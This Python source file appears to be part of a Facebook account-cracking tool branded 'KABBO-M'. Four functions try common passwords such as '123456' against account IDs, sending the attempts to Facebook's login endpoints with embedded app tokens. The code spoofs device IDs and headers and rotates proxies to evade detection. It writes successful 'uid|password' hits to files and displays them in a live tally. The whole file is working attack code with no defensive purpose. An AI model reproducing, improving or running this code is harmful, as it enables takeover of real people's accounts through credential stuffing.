import sys
import time
import random
import requests
import config
from useragent import get_ua, is_fb_ua, is_mobile_ua
from uid import creationyear, fake_device_ids
from proxy import next_proxy
from config import inc_loop, add_ok

G   = '\x1b[38;5;46m'
Y   = '\x1b[38;5;220m'
CY  = '\x1b[38;5;51m'
W   = '\x1b[1;97m'
DIM = '\x1b[2;37m'
R   = '\x1b[38;5;196m'
RST = '\x1b[0m'


def _rand_hex(n):
    return ''.join(random.choices('0123456789abcdef', k=n))

def _rand_hni():
    return str(random.randint(20000, 40000))

def _rand_session_id():
    return f"nid={_rand_hex(16)};pid=Main;tid={random.randint(100, 999)};"


def _status_line(method):
    sys.stdout.write(
        f"\r  {DIM}❯ KABBO-M{method}{RST}  "
        f"Tried {CY}{config.loop}{RST}  {DIM}│{RST}  "
        f"Hits {G}{len(config.oks)}{RST}    "
    )
    sys.stdout.flush()


def _hit_line(method, uid, pw):
    year = creationyear(uid)
    year_str = f"  {DIM}│{RST}  {G}{year}{RST}" if year else ''
    sys.stdout.write(
        f"\r  {G}✔{RST}  {CY}KABBO-M{method}{RST}  "
        f"{W}{uid}{RST}  {DIM}│{RST}  {Y}{pw}{RST}{year_str}\n"
    )
    sys.stdout.flush()


def _fb_headers_post(ua, host):
    if is_fb_ua():
        return {
            'User-Agent':                  ua,
            'Content-Type':                'application/x-www-form-urlencoded',
            'Host':                        host,
            'X-FB-Net-HNI':                _rand_hni(),
            'X-FB-SIM-HNI':                _rand_hni(),
            'X-FB-Connection-Type':        'MOBILE.LTE',
            'X-Tigon-Is-Retry':            'False',
            'x-fb-session-id':             _rand_session_id(),
            'x-fb-device-group':           str(random.randint(4000, 6000)),
            'X-FB-Friendly-Name':          'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'X-FB-HTTP-Engine':            'Liger',
            'X-FB-Client-IP':              'True',
            'X-FB-Server-Cluster':         'True',
            'x-fb-connection-token':       _rand_hex(32),
        }
    elif is_mobile_ua():
        return {
            'User-Agent':      ua,
            'Content-Type':    'application/x-www-form-urlencoded',
            'Host':            host,
            'Accept':          'application/json',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection':      'keep-alive',
        }
    else:
        return {
            'User-Agent':      ua,
            'Content-Type':    'application/x-www-form-urlencoded',
            'Host':            host,
            'Accept':          'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection':      'keep-alive',
        }


def _fb_headers_get(ua):
    if is_fb_ua():
        return {
            'x-fb-connection-bandwidth': str(random.randint(20000000, 29999999)),
            'x-fb-sim-hni':              _rand_hni(),
            'x-fb-net-hni':              _rand_hni(),
            'x-fb-connection-quality':   'EXCELLENT',
            'x-fb-connection-type':      'cell.CTRadioAccessTechnologyHSDPA',
            'user-agent':                ua,
            'content-type':              'application/x-www-form-urlencoded',
            'x-fb-http-engine':          'Liger',
            'x-fb-session-id':           _rand_session_id(),
            'x-fb-connection-token':     _rand_hex(32),
        }
    elif is_mobile_ua():
        return {
            'user-agent':      ua,
            'content-type':    'application/x-www-form-urlencoded',
            'accept':          'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'connection':      'keep-alive',
        }
    else:
        return {
            'user-agent':      ua,
            'content-type':    'application/x-www-form-urlencoded',
            'accept':          'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.5',
            'connection':      'keep-alive',
        }


def _post_login(uid, pw, url, host, hit_file, method_num):
    ids  = fake_device_ids()
    ua   = get_ua()
    data = {
        'adid':                       ids['adid'],
        'format':                     'json',
        'device_id':                  ids['device_id'],
        'cpl':                        'true',
        'family_device_id':           ids['family_device_id'],
        'credentials_type':           'device_based_login_password',
        'error_detail_type':          'button_with_disabled',
        'source':                     'device_based_login',
        'email':                      str(uid),
        'password':                   str(pw),
        'access_token':               '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
        'generate_session_cookies':   '1',
        'meta_inf_fbmeta':            '',
        'advertiser_id':              ids['advertiser_id'],
        'currently_logged_in_userid': '0',
        'locale':                     'en_US',
        'client_country_code':        'US',
        'method':                     'auth.login',
        'fb_api_req_friendly_name':   'authenticate',
        'fb_api_caller_class':        'com.facebook.account.login.protocol.Fb4aAuthHandler',
        'api_key':                    '882a8490361da98702bf97a021ddc14d',
    }
    session = requests.session()
    session.proxies = next_proxy() or {}
    res = session.post(url, data=data, headers=_fb_headers_post(ua, host), allow_redirects=False).json()
    if 'session_key' in res or 'www.facebook.com' in res.get('error', {}).get('message', ''):
        _hit_line(method_num, uid, pw)
        open(hit_file, 'a').write(f"{uid}|{pw}\n")
        add_ok(uid)
        return True
    return False


def _get_login(uid, pw, url, hit_file, method_num, proxy):
    ua = get_ua()
    with requests.Session() as session:
        session.proxies = proxy
        po = session.get(url, headers=_fb_headers_get(ua)).json()
        if 'session_key' in str(po):
            _hit_line(method_num, uid, pw)
            open(hit_file, 'a').write(f"{uid}|{pw}\n")
            add_ok(uid)
            return True
    return False


def login_1(uid):
    try:
        for pw in ('123456', '1234567', '12345678', '123456789'):
            _status_line(1)
            if _post_login(uid, pw,
                           'https://b-graph.facebook.com/auth/login',
                           'b-graph.facebook.com',
                           '/sdcard/KABBO-M1-HITS.txt', 1):
                break
    except Exception:
        time.sleep(5)
    finally:
        inc_loop()


def login_2(uid):
    _proxy = next_proxy() or {}
    try:
        for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
            _status_line(2)
            try:
                url = (
                    f"https://b-api.facebook.com/method/auth.login?format=json"
                    f"&email={uid}&password={pw}"
                    f"&credentials_type=device_based_login_password"
                    f"&generate_session_cookies=1&error_detail_type=button_with_disabled"
                    f"&source=device_based_login&meta_inf_fbmeta=%20"
                    f"&currently_logged_in_userid=0&method=GET&locale=en_US"
                    f"&client_country_code=US"
                    f"&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler"
                    f"&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                    f"&fb_api_req_friendly_name=authenticate&cpl=true"
                )
                if _get_login(uid, pw, url, '/sdcard/KABBO-M2-HITS.txt', 2, _proxy):
                    break
            except Exception:
                pass
    finally:
        inc_loop()


def login_3(uid):
    try:
        for pw in ('123456', '1234567', '12345678', '123456789'):
            _status_line(3)
            if _post_login(uid, pw,
                           'https://graph.facebook.com/auth/login',
                           'graph.facebook.com',
                           '/sdcard/KABBO-M3-HITS.txt', 3):
                break
    except Exception:
        time.sleep(5)
    finally:
        inc_loop()


def login_4(uid):
    _proxy = next_proxy() or {}
    try:
        for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
            _status_line(4)
            try:
                url = (
                    f"https://api.facebook.com/method/auth.login?format=json"
                    f"&email={uid}&password={pw}"
                    f"&credentials_type=device_based_login_password"
                    f"&generate_session_cookies=1&error_detail_type=button_with_disabled"
                    f"&source=device_based_login&meta_inf_fbmeta=%20"
                    f"&currently_logged_in_userid=0&method=GET&locale=en_US"
                    f"&client_country_code=US"
                    f"&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler"
                    f"&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                    f"&fb_api_req_friendly_name=authenticate&cpl=true"
                )
                if _get_login(uid, pw, url, '/sdcard/KABBO-M4-HITS.txt', 4, _proxy):
                    break
            except Exception:
                pass
    finally:
        inc_loop()
